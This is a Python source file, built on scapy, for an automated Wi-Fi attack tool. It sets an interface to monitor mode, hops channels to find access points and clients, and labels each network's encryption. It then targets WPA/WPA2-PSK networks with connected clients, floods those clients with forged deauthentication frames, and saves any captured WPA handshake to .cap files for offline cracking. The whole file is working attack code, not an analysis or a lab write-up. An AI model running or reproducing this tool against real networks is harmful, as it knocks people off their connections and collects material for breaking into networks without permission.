from scapy.all import *
import subprocess
import os
import sys
import threading
import queue
import time
import signal
import curses

# -------------------
# Logging settings
# -------------------
logger = None

def set_logger(external_logger):
    global logger
    logger = external_logger


# -------------------
# Global objects and variables
# -------------------
try:
    devnull = open(os.devnull, 'w')
except Exception:
    logger.critical("[SCANNER] Error opening /dev/null, something seriously wrong")
    raise Exception("Error opening /dev/null, something seriously wrong")

scr = []
stop_threads = False
terminate_program = False

WEP_FLAG = 0b01000000
DS_FLAG = 0b11
TO_DS = 0b01
FROM_DS = 0b10

# -------------------
# Signal handler
# -------------------
def handle_signal(signal_num, frame):
    global stop_threads, terminate_program
    terminate_program = True
    stop_threads = True

    global scr, pad_height
    if scr:
        curses.echo()
        curses.endwin()
        scr_contents = []
        for i in range(0, pad_height):
            scr_contents.append(scr.instr(i, 0).decode(errors="ignore"))
        logger.info("\n".join(scr_contents))

    raise KeyboardInterrupt

signal.signal(signal.SIGINT, handle_signal)

# -------------------
# Classes and exceptions
# -------------------
class FError(Exception):
    def __init__(self, error_string):
        global terminate_program
        terminate_program = True
        logger.error(f"[SCANNER] ERROR: {error_string}")
        exit()

class AP:
    def __init__(self, bssid):
        self.bssid = bssid
        self.ssid = []
        self.power_db = []
        self.channel = []
        self.enc = []
        self.frames = 1

class Client:
    def __init__(self, mac):
        self.mac = mac
        self.bssid = []
        self.ssid = []
        self.power_db = []
        self.frames = 1

# -------------------
# Definition of encryption
# -------------------
def determineEncryption(p):
    if p.subtype != 8:  # not Beacon
        return None
    
    enc = []
    if p.haslayer(Dot11Elt): # type: ignore
        elt = p[Dot11Elt] # type: ignore
        while isinstance(elt, Dot11Elt): # type: ignore
            # WPA2 / RSN
            if elt.ID == 48:
                info = elt.info
                # The AKM Suite List field begins after a few bytes,
                # need to parse (see RSN IE format)
                if b"\x00\x0f\xac\x08" in info:  # SAE
                    enc.append("WPA3-SAE")
                elif b"\x00\x0f\xac\x02" in info:  # PSK
                    enc.append("WPA2-PSK")
                elif b"\x00\x0f\xac\x01" in info:  # 802.1X
                    enc.append("WPA2-Enterprise")
                elif b"\x00\x0f\xac\x18" in info:  # OWE
                    enc.append("WPA3-OWE")
                else:
                    enc.append("WPA2-Other")

            # WPA (Microsoft OUI)
            elif elt.ID == 221 and elt.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                enc.append("WPA")

            # WAPI (Chinese WLAN)
            elif elt.ID == 68:
                enc.append("WAPI")

            elt = elt.payload

    if not enc:
        if (p.FCfield & 0x40 != 0):  # WEP flag
            enc.append("WEP")
        else:
            enc.append("OPN")
    
    return enc

# -------------------
# Scanning APs and clients
# -------------------
def scanAPClients(interface, bssid_filter, essid_filter, ignore_bssid, channel, timeout, scr, output_folder):
    ap_bssid = []
    cl_mac = []
    access_points = []
    clients = []
    global curr_time, channel_time, set_channel
    curr_time = time.perf_counter()
    if channel:
        setInterfaceChannel(interface, channel)
        set_channel = []
    else:
        set_channel = 1
    channel_time = time.perf_counter()

    def filterPackets(p):
        global terminate_program
        if terminate_program:
            raise KeyboardInterrupt

        global channel_time, set_channel
        if set_channel:
            if (time.perf_counter() - channel_time) > 0.05:
                channel_time = time.perf_counter()
                set_channel = (set_channel + 1) % 14
                if set_channel == 0:
                    set_channel = 1
                setInterfaceChannel(interface, set_channel)

        if not scr:
            global curr_time
            if (time.perf_counter() - curr_time) > 0.1:
                curr_time = time.perf_counter()

        DS = p.FCfield & DS_FLAG
        to_ds = p.FCfield & TO_DS != 0
        from_ds = p.FCfield & FROM_DS != 0

        if not to_ds and not from_ds:
            dst_addr = p.addr1
            src_addr = p.addr2
            bss_addr = p.addr3
        elif not to_ds and from_ds:
            dst_addr = p.addr1
            src_addr = p.addr3
            bss_addr = p.addr2
        elif to_ds and not from_ds:
            dst_addr = p.addr3
            src_addr = p.addr2
            bss_addr = p.addr1
        else:
            return

        if ignore_bssid and bss_addr in ignore_bssid:
            return
        if bssid_filter and bss_addr not in bssid_filter:
            return
        if essid_filter:
            try:
                if p.info not in essid_filter:
                    return
            except:
                return

        if bss_addr not in (None, "ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            if bss_addr not in ap_bssid:
                ap_bssid.append(bss_addr)
                access_points.append(AP(bss_addr))
                access_points[-1].power_db = -(256 - p.notdecoded[-4])
                try:
                    access_points[-1].channel = int(p[Dot11Elt:3].info[0]) # type: ignore
                except:
                    pass
                try:
                    access_points[-1].ssid = p.info.decode(errors="ignore")
                except:
                    pass
                access_points[-1].enc = determineEncryption(p)
                logger.debug(f"[SCANNER] [SCAN] {interface} Discovered AP: {access_points[-1].ssid} ({bss_addr}) channel {access_points[-1].channel} enc {access_points[-1].enc}")
            else:
                for ap in access_points:
                    if ap.bssid == bss_addr:
                        ap.power_db = (ap.power_db - (256 - p.notdecoded[-4])) / 2
                        if not ap.enc:
                            ap.enc = determineEncryption(p)

                        if not ap.ssid:
                            try:
                                ap.ssid = p.info.decode(errors="ignore")
                            except:
                                pass
                        if not ap.channel:
                            try:
                                ap.channel = int(p[Dot11Elt:3].info[0]) # type: ignore
                            except:
                                pass
                        
                        ap.frames = ap.frames + 1
                        break
            if scr:
                for ap in access_points:
                    if ap.bssid == bss_addr:
                        updateCursesScreen(scr, ap)
                        break

        addr = [ad for ad in (dst_addr, src_addr) if ad not in (None, bss_addr, "ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00")]
        for ad in addr:
            if ad not in cl_mac:
                cl_mac.append(ad)
                clients.append(Client(ad))
                clients[-1].power_db = -(256 - p.notdecoded[-4])
                try:
                    clients[-1].ssid = p.info.decode(errors="ignore")
                except:
                    pass
                if bss_addr not in (None, "ff:ff:ff:ff:ff:ff"):
                    clients[-1].bssid = bss_addr
                logger.debug(f"[SCANNER] [SCAN] {interface} Discovered Client: {ad} associated with AP {bss_addr}")
            else:
                for cl in clients:
                    if cl.mac == ad:
                        cl.power_db = (cl.power_db - (256 - p.notdecoded[-4])) / 2
                        cl.frames = cl.frames + 1
                        if not cl.ssid:
                            try:
                                cl.ssid = p.info.decode(errors="ignore")
                            except:
                                pass
                        break

    def __sniff(interface, filter, timeout):
        try:
            sniff(iface=interface, store=0, prn=filter, timeout=timeout)
        except KeyboardInterrupt:
            sys.exit()
        except Exception as e:
            logger.warning(f"[SCANNER] [SCAN] {interface} Scan failed: {e}. Retrying...")
            time.sleep(2)
            __sniff(interface, filter, timeout)

    if not scr:
        logger.info(f"[SCANNER] [SCAN] {interface} Scanning for {timeout}s on interface {interface}")
    __sniff(interface, filterPackets, timeout)
    if not scr:
        sys.stdout.write('\n')

    return access_points, clients

# -------------------
# Interface and monitor mode
# -------------------
ip_iw = False
ifconfig_iwconfig = False

def interfaceMonitorMode(interface):
    global ip_iw, ifconfig_iwconfig
    ip_iw = False
    ifconfig_iwconfig = False
    if_command = []
    iw_command = []
    mode_check = []

    for path in os.environ["PATH"].split(os.pathsep):
        ifpath = os.path.join(path, "ifconfig")
        iwpath = os.path.join(path, "iwconfig")
        if os.path.isfile(ifpath):
            if_command = f"ifconfig {interface} "
        if os.path.isfile(iwpath):
            iw_command = f"iwconfig {interface} mode monitor"
            mode_check = f"iwconfig {interface}"
            ifconfig_iwconfig = True

    if not if_command or not iw_command:
        for path in os.environ["PATH"].split(os.pathsep):
            ifpath = os.path.join(path, "ip")
            iwpath = os.path.join(path, "iw")
            if os.path.isfile(ifpath):
                if_command = f"ip link set dev {interface} "
            if os.path.isfile(iwpath):
                iw_command = f"iw {interface} set monitor control"
                mode_check = f"iw dev {interface} info"
                ip_iw = True

    if not if_command or not iw_command:
        raise FError("Install either 'ifconfig','iwconfig' or 'ip','iw'")

    s = subprocess.Popen(mode_check, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err:
        raise FError(f"No interface '{interface}' found")
    if b"monitor" in output.lower():
        logger.info(f"[SCANNER] [MON] Interface '{interface}' already in monitor mode")
        return

    s = subprocess.Popen(f"{if_command} down", shell=True, stdout=devnull, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err:
        raise FError("Bringing interface down")
    s = subprocess.Popen(iw_command, shell=True, stdout=devnull, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err:
        raise FError("Placing interface in monitor mode")
    s = subprocess.Popen(f"{if_command} up", shell=True, stdout=devnull, stderr=subprocess.PIPE)
    output, err = s.communicate()
    if err:
        raise FError("Bringing interface back up")
    logger.info(f"[SCANNER] [MON] Interface '{interface}' placed into monitor mode")

def setInterfaceChannel(interface, channel):
    global ip_iw, ifconfig_iwconfig, devnull
    try:
        if ifconfig_iwconfig:
            s = subprocess.Popen(f"iwconfig {interface} channel {channel}", shell=True, stdout=devnull, stderr=subprocess.PIPE)
            output, err = s.communicate()
            if err:
                raise FError("Changing channel on interface")
        elif ip_iw:
            s = subprocess.Popen(f"iw dev {interface} set channel {channel}", shell=True, stdout=devnull, stderr=subprocess.PIPE)
            output, err = s.communicate()
            if err:
                raise FError("Changing channel on interface")
        logger.info(f"[SCANNER] [CHANNEL] Set interface {interface} to channel {channel}")
    except Exception as e:
        logger.error(f"[SCANNER] [CHANNEL] {interface} Failed to set channel: {e}")
        raise

# -------------------
# WPA capture and deauthentication streams
# -------------------
def sniffAPThread(interface, bssid, channel, waittime, que, output_folder):
    to_frames = []
    from_frames = []
    clients = []
    setInterfaceChannel(interface, channel)
    global captured_handshake
    captured_handshake = False

    def checkForWPAHandshake(p):
        global stop_threads, terminate_program
        if terminate_program:
            raise KeyboardInterrupt
        if stop_threads:
            return True
        if EAPOL in p: # type: ignore
            DS = p.FCfield & DS_FLAG
            to_ds = p.FCfield & TO_DS != 0
            client = p.addr2 if to_ds else p.addr1
            if client not in clients:
                clients.append(client)
                to_frames.append(0)
                from_frames.append(0)
            idx = clients.index(client)
            if to_ds:
                to_frames[idx] += 1
            else:
                from_frames[idx] += 1
            if to_frames[idx] >= 2 and from_frames[idx] >= 2:
                global captured_handshake
                captured_handshake = True
                logger.info(f"[SCANNER] [AP] {interface} Captured handshake for client {client} on AP {bssid}")
                return True
            return False
        return False

    def __sniff(interface, filter_expr, stop_filter, timeout):
        try:
            cap = sniff(iface=interface, filter=filter_expr, stop_filter=stop_filter, timeout=timeout)
            return cap
        except KeyboardInterrupt:
            sys.exit()
        except Exception as e:
            logger.warning(f"[SCANNER] [AP] {interface} WPA sniff failed: {e}. Retrying...")
            time.sleep(1)
            return __sniff(interface, filter_expr, stop_filter, timeout)

    f = f"ether host {bssid}"
    cap = __sniff(interface, f, checkForWPAHandshake, waittime)
    que.put(captured_handshake)
    if captured_handshake:
        que.put(cap)
    else:
        del cap

def deauthClientThread(bssid, clients, count, interface):
    global stop_threads, terminate_program
    for client in clients:
        pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7) # type: ignore
        for _ in range(count):
            if stop_threads or terminate_program:
                return
            try:
                sendp(pkt, iface=interface, count=1, inter=0.05, verbose=0)
                logger.debug(f"[SCANNER] [DEAUTH] Sended deauth paket to {bssid} - {client} via {interface}")
            except Exception as e:
                logger.warning(f"[SCANNER] [DEAUTH] {interface} Failed to send deauth packet to {client} with {e}")
        for _ in range(10):
            if stop_threads or terminate_program:
                return
            time.sleep(0.1)

# -------------------
# Auto-scanning and WPA capture
# -------------------
def scanModeAuto(interface, bssid_filter, essid_filter, ignore_bssid, channel, scantime, waittime, output_folder, deauth_count):
    global stop_threads
    access_points, clients = scanAPClients(interface, bssid_filter, essid_filter, ignore_bssid, channel, scantime, [], output_folder)
    if terminate_program:
        exit()

    if not access_points:
        logger.warning(f"[SCANNER] [SCAN] {interface} No access points found during scan")
        return
    if not clients:
        logger.warning(f"[SCANNER] [SCAN] {interface} No clients found during scan")
        return

    mac = []
    bssid = []
    ssid = []
    frames = []
    channel_list = []
    for cl in clients:
        if cl.bssid:
            for ap in access_points:
                if ap.bssid == cl.bssid:
                    if ap.bssid in ignore_bssid:
                        continue
                    if not ap.channel:
                        continue
                    if ap.frames < 5:
                        continue
                    # 
                    if ap.enc:
                        if any(x in ap.enc for x in ["WPA3-SAE", "WPA3-OWE", "WPA2-Enterprise"]):
                            logger.warning(f"[SCANNER] [SCAN] {interface} Ignoring AP {ap.ssid} ({ap.bssid}) with enc {ap.enc}")
                            continue

                    mac.append(cl.mac)
                    bssid.append(cl.bssid)
                    channel_list.append(ap.channel)
                    ssid.append(ap.ssid if ap.ssid else f"Unknown({cl.bssid})")
                    frames.append(cl.frames)
                    break

    if not bssid:
        logger.warning(f"[SCANNER] [SCAN] {interface} No valid APs with connected clients found.")
        time.sleep(2)
        return

    unique_bssid = list(set(bssid))
    total_frames = [0]*len(unique_bssid)
    unique_ssid = []
    unique_channel = []

    for ubs in unique_bssid:
        for idx, bs in enumerate(bssid):
            if bs == ubs:
                unique_ssid.append(ssid[idx])
                unique_channel.append(channel_list[idx])
                break

    for idx, ubs in enumerate(unique_bssid):
        for idx2, bs in enumerate(bssid):
            if bs == ubs:
                total_frames[idx] += frames[idx2]

    sorted_data = sorted(zip(total_frames, unique_bssid, unique_ssid, unique_channel), reverse=True)
    if not sorted_data:
        logger.warning(f"[SCANNER] [SCAN] {interface} No access points with frames found.")
        time.sleep(2)
        return

    total_frames, unique_bssid, unique_ssid, unique_channel = map(list, zip(*sorted_data))
    ap_clients = []
    for bs in unique_bssid:
        idx_list = [i for i, b in enumerate(bssid) if b == bs]
        f_list = [frames[i] for i in idx_list]
        cl_list = [mac[i] for i in idx_list]
        cl_list = [y for x, y in sorted(zip(f_list, cl_list), reverse=True)]
        cl_list.append("ff:ff:ff:ff:ff:ff")
        ap_clients.append(cl_list)

    q = queue.Queue()
    logger.info(f"[SCANNER] [SCAN] {interface} Found {len(unique_bssid)} access points with connected clients")
    for idx, bs in enumerate(unique_bssid):
        logger.info(f"[SCANNER] [SCAN] {interface} Deauthing {len(ap_clients[idx])} clients on {unique_ssid[idx]} (channel {unique_channel[idx]})")
        stop_threads = False
        st = threading.Thread(target=sniffAPThread, args=(interface, bs, unique_channel[idx], waittime, q, output_folder))
        dt = threading.Thread(target=deauthClientThread, args=(bs, ap_clients[idx], deauth_count, interface))
        st.start()
        dt.start()
        while st.is_alive():
            time.sleep(1)
        stop_threads = True
        if q.get():
            logger.info(f"[SCANNER] [HANDSHAKE] {interface} Captured WPA handshake! ({unique_ssid[idx]}, {bs})")
            cap = q.get()
            wrpcap(output_folder + unique_ssid[idx] + "_" + unique_bssid[idx] + ".cap", cap)
            del cap
            ignore_bssid.append(bs)
        else:
            logger.warning(f"[SCANNER] [HANDSHAKE] {interface} Handshake capture failed ({unique_ssid[idx]}, {bs})")
    del q
    del access_points
    del clients

# -------------------
# Curses screen
# -------------------
def initializeCursesScreen():
    global row_format, pad_pos, pad_height, pad_width, curses_ap, ap_row
    curses_ap = []
    ap_row = []
    stdscr = curses.initscr()
    curses.noecho()
    pad_height, pad_width = stdscr.getmaxyx()
    mypad = curses.newpad(pad_height+10, pad_width)
    pad_pos = 0
    mypad.refresh(pad_pos, 0, 0, 0, pad_height-1, pad_width)
    header = ["BSSID", "SSID", "CHANNEL", "POWER", "ENC", "# FRAMES"]
    row_format = "{:>20}" * (len(header) + 1)
    mypad.addstr(5, 0, row_format.format("", *header), curses.A_BOLD)
    mypad.refresh(pad_pos, 0, 0, 0, pad_height-1, pad_width)
    return mypad

def updateCursesScreen(scr, AP):
    global row_format, pad_pos, pad_height, pad_width, curses_ap, ap_row

    if AP.bssid is None:
        return

    for idx, ap in enumerate(curses_ap):
        if ap.bssid == AP.bssid:
            ssid = (AP.ssid[:16] + "...") if len(AP.ssid) > 16 else AP.ssid
            row_data = [AP.bssid, ssid, AP.channel, AP.power_db, AP.enc, AP.frames]
            try:
                scr.addstr(ap_row[idx], 0, row_format.format("", *row_data))
            except Exception as e:
                logger.error(f"[SCANNER] [CURSES] Failed to update curses screen: {e}")
            scr.refresh(pad_pos, 0, 0, 0, pad_height-1, pad_width)
            return

    curses_ap.append(AP)
    ap_row.append(len(ap_row)+6)
    ssid = (AP.ssid[:16] + "...") if len(AP.ssid) > 16 else AP.ssid
    row_data = [AP.bssid, ssid, AP.channel, AP.power_db, AP.enc, AP.frames]
    try:
        scr.addstr(ap_row[-1], 0, row_format.format("", *row_data))
    except Exception as e:
        logger.error(f"[SCANNER] [CURSES] Failed to update curses screen: {e}")

    scr.refresh(pad_pos, 0, 0, 0, pad_height-1, pad_width)
    return
